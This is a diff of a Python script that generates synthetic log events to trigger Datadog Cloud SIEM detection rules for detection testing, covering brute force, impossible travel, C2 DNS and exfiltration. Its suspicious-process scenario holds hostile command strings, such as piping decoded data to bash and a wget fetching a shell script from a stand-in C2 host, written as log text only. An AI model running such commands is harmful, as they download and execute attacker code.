@@ -2,30 +2,30 @@
 """
 Cloud SIEM Event Generator
 
-Produces log lines that match common Datadog Cloud SIEM detection rules.
-Outputs to stdout (pipe to a file that the Datadog Agent tails) or writes
-directly to a log file.
+Produces log lines that match Datadog Cloud SIEM out-of-the-box detection rules.
+Each scenario writes to a separate log file so the Datadog Agent can tag them
+with the correct source (sshd, auth, dns, sudo, auditd, firewall).
 
 Usage:
-    python event-generator.py                     # Run all scenarios once
-    python event-generator.py --loop --interval 30  # Run continuously
-    python event-generator.py --scenario brute_force  # Run specific scenario
-    python event-generator.py --output /var/log/sandbox/security.log
+    python event-generator.py                          # Run all scenarios once
+    python event-generator.py --loop --interval 30     # Run continuously
+    python event-generator.py --scenario brute_force   # Run one scenario
+    python event-generator.py --output-dir /var/log/sandbox  # Custom output dir
 """
 
 import argparse
 import json
+import os
 import random
 import sys
 import time
 from datetime import datetime, timezone
 
-# Fake source IPs for attack simulation
 ATTACKER_IPS = [
-    "198.51.100.42",    # Known bad IP (RFC 5737 documentation range)
-    "203.0.113.99",     # Another documentation range
-    "192.0.2.200",      # Documentation range
-    "45.33.32.156",     # Scanme-like
+    "198.51.100.42",
+    "203.0.113.99",
+    "192.0.2.200",
+    "45.33.32.156",
 ]
 
 INTERNAL_IPS = [
@@ -51,122 +51,169 @@ C2_DOMAINS = [
     "botnet-controller.tk",
 ]
 
+DEFAULT_OUTPUT_DIR = "/var/log/sandbox"
+
 
 def ts():
     return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
 
 
-def emit(log_entry, output):
-    line = json.dumps(log_entry) if isinstance(log_entry, dict) else str(log_entry)
-    if output:
-        with open(output, "a") as f:
+def emit(log_entry, filepath):
+    line = json.dumps(log_entry)
+    if filepath:
+        os.makedirs(os.path.dirname(filepath), exist_ok=True)
+        with open(filepath, "a") as f:
             f.write(line + "\n")
     else:
         print(line, flush=True)
 
 
-def brute_force(output=None):
-    """Generate failed SSH login attempts (brute force pattern)."""
+def log_path(output_dir, filename):
+    if output_dir:
+        return os.path.join(output_dir, filename)
+    return None
+
+
+def brute_force(output_dir=None):
+    """SSH brute force: 15 failures then 1 success from the same IP."""
     print("[SIEM] Generating: Brute force SSH login attempts", file=sys.stderr)
     ip = random.choice(ATTACKER_IPS)
+    fp = log_path(output_dir, "sshd.log")
     for _ in range(15):
         user = random.choice(USERNAMES)
         emit({
             "timestamp": ts(),
-            "source": "sshd",
-            "service": "ssh",
+            "status": "warning",
             "host": "sandbox-host",
+            "service": "sshd",
             "message": f"Failed password for {user} from {ip} port {random.randint(40000, 65000)} ssh2",
-            "evt": {"name": "authentication", "outcome": "failure"},
+            "evt": {
+                "name": "authentication",
+                "category": "authentication",
+                "outcome": "failure",
+            },
             "network": {"client": {"ip": ip}},
-            "usr": {"name": user},
-            "severity": "warning",
-        }, output)
+            "usr": {"id": user},
+        }, fp)
         time.sleep(0.2)
-    # One success after the failures
     emit({
         "timestamp": ts(),
-        "source": "sshd",
-        "service": "ssh",
+        "status": "critical",
         "host": "sandbox-host",
+        "service": "sshd",
         "message": f"Accepted password for root from {ip} port 54321 ssh2",
-        "evt": {"name": "authentication", "outcome": "success"},
+        "evt": {
+            "name": "authentication",
+            "category": "authentication",
+            "outcome": "success",
+        },
         "network": {"client": {"ip": ip}},
-        "usr": {"name": "root"},
-        "severity": "critical",
-    }, output)
+        "usr": {"id": "root"},
+    }, fp)
 
 
-def impossible_travel(output=None):
-    """Generate auth events from geographically distant locations in quick succession."""
+def impossible_travel(output_dir=None):
+    """Auth from NYC then Moscow within seconds for the same user."""
     print("[SIEM] Generating: Impossible travel", file=sys.stderr)
     user = "admin"
     loc1 = GEO_LOCATIONS[0]  # New York
     loc2 = GEO_LOCATIONS[1]  # Moscow
+    fp = log_path(output_dir, "auth.log")
 
     emit({
         "timestamp": ts(),
-        "source": "auth",
-        "service": "webapp",
+        "status": "info",
         "host": "sandbox-host",
+        "service": "webapp",
         "message": f"User {user} logged in from {loc1['city']}, {loc1['country']}",
-        "evt": {"name": "authentication", "outcome": "success"},
-        "network": {"client": {"ip": ATTACKER_IPS[0], "geo": loc1}},
-        "usr": {"name": user},
-    }, output)
+        "evt": {
+            "name": "authentication",
+            "category": "authentication",
+            "outcome": "success",
+        },
+        "network": {
+            "client": {
+                "ip": ATTACKER_IPS[0],
+                "geoip": {
+                    "city_name": loc1["city"],
+                    "country_iso_code": loc1["country"],
+                    "location": {"lat": loc1["lat"], "lon": loc1["lon"]},
+                },
+            },
+        },
+        "usr": {"id": user},
+    }, fp)
 
     time.sleep(2)
 
     emit({
         "timestamp": ts(),
-        "source": "auth",
-        "service": "webapp",
+        "status": "info",
         "host": "sandbox-host",
+        "service": "webapp",
         "message": f"User {user} logged in from {loc2['city']}, {loc2['country']}",
-        "evt": {"name": "authentication", "outcome": "success"},
-        "network": {"client": {"ip": ATTACKER_IPS[1], "geo": loc2}},
-        "usr": {"name": user},
-    }, output)
+        "evt": {
+            "name": "authentication",
+            "category": "authentication",
+            "outcome": "success",
+        },
+        "network": {
+            "client": {
+                "ip": ATTACKER_IPS[1],
+                "geoip": {
+                    "city_name": loc2["city"],
+                    "country_iso_code": loc2["country"],
+                    "location": {"lat": loc2["lat"], "lon": loc2["lon"]},
+                },
+            },
+        },
+        "usr": {"id": user},
+    }, fp)
 
 
-def suspicious_dns(output=None):
-    """Generate DNS queries to known C2/malware domains."""
+def suspicious_dns(output_dir=None):
+    """DNS queries to known C2/malware domains."""
     print("[SIEM] Generating: Suspicious DNS queries", file=sys.stderr)
+    fp = log_path(output_dir, "dns.log")
     for domain in C2_DOMAINS:
         emit({
             "timestamp": ts(),
-            "source": "dns",
-            "service": "resolver",
+            "status": "warning",
             "host": "sandbox-host",
+            "service": "dns",
             "message": f"DNS query for {domain} from {random.choice(INTERNAL_IPS)}",
             "dns": {"question": {"name": domain, "type": "A"}},
             "network": {"client": {"ip": random.choice(INTERNAL_IPS)}},
-            "severity": "high",
-        }, output)
+        }, fp)
         time.sleep(0.5)
 
 
-def privilege_escalation(output=None):
-    """Generate sudo/su failure and unusual privilege escalation events."""
+def privilege_escalation(output_dir=None):
+    """sudo failures from unprivileged users."""
     print("[SIEM] Generating: Privilege escalation attempts", file=sys.stderr)
+    fp = log_path(output_dir, "sudo.log")
     for _ in range(5):
         user = random.choice(["testuser", "www-data", "nobody"])
         emit({
             "timestamp": ts(),
-            "source": "sudo",
-            "service": "auth",
+            "status": "warning",
             "host": "sandbox-host",
+            "service": "sudo",
             "message": f"{user} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
-            "evt": {"name": "privilege_escalation", "outcome": "failure"},
-            "usr": {"name": user},
-            "severity": "high",
-        }, output)
+            "evt": {
+                "name": "privilege_escalation",
+                "category": "authentication",
+                "outcome": "failure",
+            },
+            "usr": {"id": user},
+        }, fp)
         time.sleep(0.3)
 
 
-def suspicious_process(output=None):
-    """Generate events for unusual process execution."""
+def suspicious_process(output_dir=None):
+    """Unusual process executions: base64 decode, reverse shell, curl piped to sh."""
     print("[SIEM] Generating: Suspicious process execution", file=sys.stderr)
+    fp = log_path(output_dir, "auditd.log")
     commands = [
         ("base64", "base64 -d /tmp/encoded_payload | bash"),
         ("wget", "wget -q http://evil-c2-server.xyz/shell.sh -O /tmp/shell.sh"),
@@ -177,34 +224,39 @@ def suspicious_process(output=None):
     for proc_name, cmd in commands:
         emit({
             "timestamp": ts(),
-            "source": "process",
-            "service": "audit",
+            "status": "critical",
             "host": "sandbox-host",
+            "service": "auditd",
             "message": f"Suspicious process execution: {cmd}",
-            "process": {"name": proc_name, "command_line": cmd, "pid": random.randint(1000, 65000)},
-            "usr": {"name": "www-data"},
-            "severity": "critical",
-        }, output)
+            "process": {
+                "name": proc_name,
+                "command_line": cmd,
+                "pid": random.randint(1000, 65000),
+            },
+            "usr": {"id": "www-data"},
+        }, fp)
         time.sleep(0.5)
 
 
-def data_exfiltration(output=None):
-    """Generate events suggesting data exfiltration."""
+def data_exfiltration(output_dir=None):
+    """Large outbound data transfers to suspicious IPs."""
     print("[SIEM] Generating: Data exfiltration patterns", file=sys.stderr)
+    fp = log_path(output_dir, "firewall.log")
     for _ in range(3):
+        bytes_out = random.randint(50_000_000, 500_000_000)
+        dest_ip = random.choice(ATTACKER_IPS)
         emit({
             "timestamp": ts(),
-            "source": "network",
-            "service": "firewall",
+            "status": "warning",
             "host": "sandbox-host",
-            "message": f"Large outbound transfer to {random.choice(ATTACKER_IPS)}: {random.randint(50, 500)}MB",
+            "service": "firewall",
+            "message": f"Large outbound transfer to {dest_ip}: {bytes_out // 1_000_000}MB",
             "network": {
                 "client": {"ip": random.choice(INTERNAL_IPS)},
-                "destination": {"ip": random.choice(ATTACKER_IPS), "port": 443},
-                "bytes_written": random.randint(50_000_000, 500_000_000),
+                "destination": {"ip": dest_ip, "port": 443},
+                "bytes_written": bytes_out,
             },
-            "severity": "high",
-        }, output)
+        }, fp)
         time.sleep(1)
 
 
@@ -220,18 +272,30 @@ SCENARIOS = {
 
 def main():
     parser = argparse.ArgumentParser(description="Cloud SIEM Event Generator")
-    parser.add_argument("--scenario", choices=list(SCENARIOS.keys()), help="Run a specific scenario")
-    parser.add_argument("--output", help="Write to file instead of stdout")
-    parser.add_argument("--loop", action="store_true", help="Run continuously")
-    parser.add_argument("--interval", type=int, default=60, help="Seconds between loops (default: 60)")
+    parser.add_argument("--scenario", choices=list(SCENARIOS.keys()),
+                        help="Run a specific scenario")
+    parser.add_argument("--output-dir", default=DEFAULT_OUTPUT_DIR,
+                        help=f"Directory for log files (default: {DEFAULT_OUTPUT_DIR})")
+    parser.add_argument("--stdout", action="store_true",
+                        help="Print to stdout instead of writing files")
+    parser.add_argument("--loop", action="store_true",
+                        help="Run continuously")
+    parser.add_argument("--interval", type=int, default=60,
+                        help="Seconds between loops (default: 60)")
     args = parser.parse_args()
+
+    output_dir = None if args.stdout else args.output_dir
+
+    if output_dir:
+        os.makedirs(output_dir, exist_ok=True)
+        print(f"[SIEM] Writing logs to {output_dir}/", file=sys.stderr)
 
     while True:
         if args.scenario:
-            SCENARIOS[args.scenario](args.output)
+            SCENARIOS[args.scenario](output_dir)
         else:
             for name, fn in SCENARIOS.items():
-                fn(args.output)
+                fn(output_dir)
                 time.sleep(2)
 
         if not args.loop:
